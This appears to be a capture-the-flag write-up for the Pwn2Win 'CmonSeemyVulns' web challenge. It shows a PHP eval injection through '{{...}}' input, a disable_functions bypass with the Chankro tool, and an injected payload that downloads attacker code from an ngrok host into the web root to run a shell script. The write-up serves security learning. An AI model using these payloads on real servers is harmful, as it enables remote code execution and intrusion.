---
title: Pwn2Win - CmonSeemyVulns - Writeup
tags: web php disable_functions chankro
---

# Description

![2021-05-30_21-03](https://user-images.githubusercontent.com/84577967/120118699-267d5280-c194-11eb-8fae-0fec1de1b704.png)

We were given a source code with the Dockerfile.

[c_mon_see_my_vulns](https://github.com/ab2pentest/ctfwriteups/files/6566856/c_mon_see_my_vulns_70097e678d572b03e8098868191037f5c3518ca4a8d0512573845db8a293a153.tar.gz)

# Code Review

![2021-05-30_20-54](https://user-images.githubusercontent.com/84577967/120118712-31d07e00-c194-11eb-9ca7-dea97992fbed.png)

Snipped code from: index.php (Only PHP Part !)

![code](https://user-images.githubusercontent.com/84577967/174141852-b43da8d4-6069-43a4-a93f-406eb0b44b37.png)

So in the 7th line we have an eval inside a function `do_calcs` that has been called in the line 17 ! 
But first we have to check the 4th line where we have the regex pattern so our php code must be inside `{{PHP EVAL CODE}}`

# Solution

If we tries to send something like `200,{{phpinfo()}}` its going to be executed !

![2021-05-30_21-11](https://user-images.githubusercontent.com/84577967/120118671-fdf55880-c193-11eb-9db9-0f1846e00f00.png)

But what I noticed is disable functions

```
exec,system,passthru,shell_exec,escapeshellarg,escapeshellcmd,proc_close,proc_open,dl,popen,show_source,posix_kill,posix_mkfifo,posix_getpwuid,posix_setpgid,posix_setsid,posix_setuid,posix_setgid,posix_seteuid,posix_setegid,posix_uname,pcntl_exec,expect_popen
```

For such situations I always use Chankro => https://github.com/TarlogicSecurity/Chankro

First Let's build our payload:

```bash
python2 chankro.py --arch 64 --input shell.sh --path /var/www/html --output exploit.txt
```

The shell.sh content:

```
#!/bin/sh
/readflag > /var/www/html/flag.txt
```

Great! Now let's start a webserver using PHP or Python and move our exploit.txt to it and go directly to exploitation ...

```
200,{{file_put_contents("/var/www/html/exploit.php",file_get_contents("http://XXXXXXXXX.ngrok.io/exploit.txt"),FILE_APPEND)}}
```

After that we can browser the file http://127.0.0.1:1337/exploit.php

# Flag

And will get easily our http://127.0.0.1:1337/flag.txt
